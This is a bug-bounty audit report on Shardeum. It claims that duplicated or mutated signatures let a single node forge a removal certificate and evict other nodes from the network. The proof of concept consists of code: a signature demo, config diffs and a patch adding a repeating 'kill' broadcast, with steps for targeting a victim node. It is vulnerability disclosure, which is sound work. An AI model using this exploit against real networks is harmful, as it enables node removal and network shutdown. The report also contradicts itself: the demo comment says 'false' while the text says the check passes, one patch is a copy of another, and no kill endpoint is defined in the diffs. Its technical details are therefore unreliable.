# #40005 \[BC-Critical] removal of node out of network via remove by app gossip and signature

## #40005 \[BC-Critical] Removal of node out of network via remove by app gossip and signature duplications

**Submitted on Feb 12th 2025 at 16:25:22 UTC by @ZhouWu for** [**Audit Comp | Shardeum: Core III**](https://immunefi.com/audit-competition/audit-comp-shardeum-core-iii)

* **Report ID:** #40005
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/shardeum/shardus-core/tree/bugbounty>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)
  * Direct loss of funds

### Description

## Description

In shardeum tech stack, crypto-utils lib is responsible for signing the payloads. The vulnearbility exist within the lib for the failure to sanitize and strictly control the signatures. The problem is a single singer with same payload can produced multiple different signature and still satisfy the crypto.verify(). This can result in a bypass of various multi signature mechnism. This the demostration for how it happen.

```javascript
const crypto = require("@shardus/crypto-utils")
const Utils = require("@shardus/types").Utils

crypto.init("69fa4195670576c0160d660c3be36556ff8d504725be8a59b5a96509e0c994bc")
crypto.setCustomStringifier(Utils.safeStringify)

const changeNthLetterCase = (str, n) => {
  const arr = str.split('')
  arr[n] = arr[n].toUpperCase()
  return arr.join('')
}
const keypair = crypto.generateKeypair()

const payload = { foo: "bar" }

const signature1 = crypto.signObj(payload, keypair.secretKey, keypair.publicKey)
signature1.sign.sig += "z"


console.log(crypto.verifyObj(payload, signature1.sign, keypair.publicKey)) // false
```

The above code demostrate even though we have mutated the siganture, the crypto.verifyObj() still return true.

The implication for this shardeum is mechnism called remove by app, which allow the removal of node x given a collective group of nodes agree to it with their signatures. The problem is that now due to the crypto lib vulnearbility above a single node can not forge multiple different signature to cloak as multiple nodes. This can result in a single node removing another node without the consent of the collective group.

### Proof of Concept

## POC

1. Launch a legitimate group of node with this patch.

```diff
diff --git a/src/config/index.ts b/src/config/index.ts
index 78a7c2c2..038a0ac3 100644
--- a/src/config/index.ts
+++ b/src/config/index.ts
@@ -143,9 +143,9 @@ config = merge(config, {
     p2p: {
       cycleDuration: 60,
       minNodesToAllowTxs: 1, // to allow single node networks
-      baselineNodes: process.env.baselineNodes ? parseInt(process.env.baselineNodes) : 1280, // config used for baseline for entering recovery, restore, and safety. Should be equivalient to minNodes on network startup
-      minNodes: process.env.minNodes ? parseInt(process.env.minNodes) : 1280,
-      maxNodes: process.env.maxNodes ? parseInt(process.env.maxNodes) : 1280,
+      baselineNodes: process.env.baselineNodes ? parseInt(process.env.baselineNodes) : 10, // config used for baseline for entering recovery, restore, and safety. Should be equivalient to minNodes on network startup
+      minNodes: process.env.minNodes ? parseInt(process.env.minNodes) : 10,
+      maxNodes: process.env.maxNodes ? parseInt(process.env.maxNodes) : 20,
       maxJoinedPerCycle: 10,
       maxSyncingPerCycle: 10,
       maxRotatedPerCycle: process.env.maxRotatedPerCycle ? parseInt(process.env.maxRotatedPerCycle) : 1,
@@ -157,7 +157,7 @@ config = merge(config, {
       amountToShrink: 5,
       maxDesiredMultiplier: 1.2,
       maxScaleReqs: 250, // todo: this will become a variable config but this should work for a 500 node demo
-      forceBogonFilteringOn: true,
+      forceBogonFilteringOn: false,
       //these are new feature in 1.3.0, we can make them default:true in shardus-core later
 
       // 1.2.3 migration starts
@@ -224,7 +224,7 @@ config = merge(config, {
       allowActivePerCycleRecover: 4, 
 
       flexibleRotationEnabled: true, //ITN 1.16.1
-      flexibleRotationDelta: 10,
+      flexibleRotationDelta: 0,
 
       maxStandbyCount: 30000, //max allowed standby nodes count
       enableMaxStandbyCount: true,
@@ -295,8 +295,8 @@ config = merge(config, {
     sharding: {
       nodesPerConsensusGroup: process.env.nodesPerConsensusGroup
         ? parseInt(process.env.nodesPerConsensusGroup)
-        : 128, //128 is the final goal
-      nodesPerEdge: process.env.nodesPerEdge ? parseInt(process.env.nodesPerEdge) : 5,
+        : 10, //128 is the final goal
+      nodesPerEdge: process.env.nodesPerEdge ? parseInt(process.env.nodesPerEdge) : 1,
       executeInOneShard: true,
     },
     stateManager: {
```

2. Apply following patch to malicious core repo

```diff
diff --git a/src/p2p/Lost.ts b/src/p2p/Lost.ts
index 69932360..59ea2d37 100644
--- a/src/p2p/Lost.ts
+++ b/src/p2p/Lost.ts
@@ -834,7 +834,7 @@ function getMultipleCheckerNodes(
   return selectedNodes
 }
 
-function removeByApp(target: P2P.NodeListTypes.Node, certificate: P2P.LostTypes.RemoveCertificate) {
+export function removeByApp(target: P2P.NodeListTypes.Node, certificate: P2P.LostTypes.RemoveCertificate) {
   /* prettier-ignore */ if (logFlags.lost) info(`Gossip remove for ${target}`)
   if (target.id === Self.id) {
     nestedCountersInstance.countEvent('p2p', 'removeByApp skip: self')
@@ -1416,7 +1416,7 @@ function upGossipHandler(payload, sender, tracker) {
   // the getTxs() function will loop through the lost object to make txs in Q3 and build the cycle record from them
 }
 
-function removeByAppHandler(payload: P2P.LostTypes.RemoveCertificate, sender, tracker) {
+export function removeByAppHandler(payload: P2P.LostTypes.RemoveCertificate, sender, tracker) {
   const [success, message] = verifyRemoveCertificate(payload, currentCycle - 2)
   if (!success) {
     error(`Bad certificate. reason:${message}`)
diff --git a/src/shardus/index.ts b/src/shardus/index.ts
index f29206b8..9c3b80d7 100644
--- a/src/shardus/index.ts
+++ b/src/shardus/index.ts
@@ -37,7 +37,7 @@ import * as CycleCreator from '../p2p/CycleCreator'
 import { netConfig } from '../p2p/CycleCreator'
 import * as GlobalAccounts from '../p2p/GlobalAccounts'
 import * as ServiceQueue from '../p2p/ServiceQueue'
-import { scheduleLostReport, removeNodeWithCertificiate } from '../p2p/Lost'
+import { scheduleLostReport, removeNodeWithCertificiate, removeByAppHandler, removeByApp } from '../p2p/Lost'
 import { activeIdToPartition, activeByIdOrder, getAgeIndexForNodeId, nodes } from '../p2p/NodeList'
 import * as Self from '../p2p/Self'
 import * as Wrapper from '../p2p/Wrapper'
@@ -3408,6 +3408,23 @@ class Shardus extends EventEmitter {
   isOnStandbyList(publicKey: string): boolean {
     return JoinV2.isOnStandbyList(publicKey)
   }
+
+  removeIntervalHandlers = []
+
+  kill(cert: RemoveCertificate): void {
+    const node = this.getNodeByPubKey(cert.nodePublicKey)
+    const handler = setInterval(()=>{
+        removeByApp(node, cert)
+    }, 2 * 1000)
+
+    if (this.removeIntervalHandlers.length > 20) {
+      for (let i = 0; i < this.removeIntervalHandlers.length; i++) {
+        clearInterval(this.removeIntervalHandlers[i])
+      }
+      this.removeIntervalHandlers = []
+    }
+    this.removeIntervalHandlers.push(handler)
+  }
 }
 
 function deepReplace(obj: object | ArrayLike<any>, find: any, replace: any): any {
```

3. Apply following patch to malicious shardeum repo

```diff
diff --git a/src/p2p/Lost.ts b/src/p2p/Lost.ts
index 69932360..59ea2d37 100644
--- a/src/p2p/Lost.ts
+++ b/src/p2p/Lost.ts
@@ -834,7 +834,7 @@ function getMultipleCheckerNodes(
   return selectedNodes
 }
 
-function removeByApp(target: P2P.NodeListTypes.Node, certificate: P2P.LostTypes.RemoveCertificate) {
+export function removeByApp(target: P2P.NodeListTypes.Node, certificate: P2P.LostTypes.RemoveCertificate) {
   /* prettier-ignore */ if (logFlags.lost) info(`Gossip remove for ${target}`)
   if (target.id === Self.id) {
     nestedCountersInstance.countEvent('p2p', 'removeByApp skip: self')
@@ -1416,7 +1416,7 @@ function upGossipHandler(payload, sender, tracker) {
   // the getTxs() function will loop through the lost object to make txs in Q3 and build the cycle record from them
 }
 
-function removeByAppHandler(payload: P2P.LostTypes.RemoveCertificate, sender, tracker) {
+export function removeByAppHandler(payload: P2P.LostTypes.RemoveCertificate, sender, tracker) {
   const [success, message] = verifyRemoveCertificate(payload, currentCycle - 2)
   if (!success) {
     error(`Bad certificate. reason:${message}`)
diff --git a/src/shardus/index.ts b/src/shardus/index.ts
index f29206b8..9c3b80d7 100644
--- a/src/shardus/index.ts
+++ b/src/shardus/index.ts
@@ -37,7 +37,7 @@ import * as CycleCreator from '../p2p/CycleCreator'
 import { netConfig } from '../p2p/CycleCreator'
 import * as GlobalAccounts from '../p2p/GlobalAccounts'
 import * as ServiceQueue from '../p2p/ServiceQueue'
-import { scheduleLostReport, removeNodeWithCertificiate } from '../p2p/Lost'
+import { scheduleLostReport, removeNodeWithCertificiate, removeByAppHandler, removeByApp } from '../p2p/Lost'
 import { activeIdToPartition, activeByIdOrder, getAgeIndexForNodeId, nodes } from '../p2p/NodeList'
 import * as Self from '../p2p/Self'
 import * as Wrapper from '../p2p/Wrapper'
@@ -3408,6 +3408,23 @@ class Shardus extends EventEmitter {
   isOnStandbyList(publicKey: string): boolean {
     return JoinV2.isOnStandbyList(publicKey)
   }
+
+  removeIntervalHandlers = []
+
+  kill(cert: RemoveCertificate): void {
+    const node = this.getNodeByPubKey(cert.nodePublicKey)
+    const handler = setInterval(()=>{
+        removeByApp(node, cert)
+    }, 2 * 1000)
+
+    if (this.removeIntervalHandlers.length > 20) {
+      for (let i = 0; i < this.removeIntervalHandlers.length; i++) {
+        clearInterval(this.removeIntervalHandlers[i])
+      }
+      this.removeIntervalHandlers = []
+    }
+    this.removeIntervalHandlers.push(handler)
+  }
 }
 
 function deepReplace(obj: object | ArrayLike<any>, find: any, replace: any): any {
```

4. Launch the malicious node by linking core and shardeum repo together
5. Wait for network to go active AS WELL AS the malicious node
6. During the first quarter of a cycle please make http GET to the malicious node's endpoint `/kill/:publickey` to kill a node. For example if the victim node is `0x1234` then call `/kill/0x1234` to remove the node from the network. If it doesn't work please time the attack again in next cycle.

## Impact

Removal of nodes - total network shutdown
